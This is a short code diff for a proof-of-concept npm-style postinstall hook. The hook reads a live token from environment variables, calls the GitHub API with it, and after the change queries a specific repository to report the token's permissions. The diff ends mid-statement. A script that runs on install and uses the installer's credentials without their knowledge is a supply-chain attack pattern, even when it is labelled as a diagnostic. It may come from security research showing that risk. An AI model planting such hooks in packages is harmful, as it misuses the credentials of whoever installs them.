@@ -9,9 +9,15 @@ if (!token) {
 } else {
   https.get({
     hostname: 'api.github.com',
-    path: '/user',
+    path: '/repos/thomassaad/test',
     headers: { 'Authorization': `Bearer ${token}`, 'User-Agent': 'poc-diagnostic' }
   }, (res) => {
-    out(`POC: postinstall hook read a live token from env and reached GitHub API, status=${res.statusCode}`);
-  }).on('error', (e) => out(`POC: token present but request errored: ${e.message}`));
-}
+    let body = '';
+    res.on('data', (c) => body += c);
+    res.on('end', () => {
+      let perms = 'unknown';
+      try { perms = JSON.stringify(JSON.parse(body).permissions || {}); } catch (e) {}
+      out(`POC: repo API status=${res.statusCode} permissions=${perms}`);
+    });
+  }).on('error', (e) => out(`POC: error=${e.
+}    
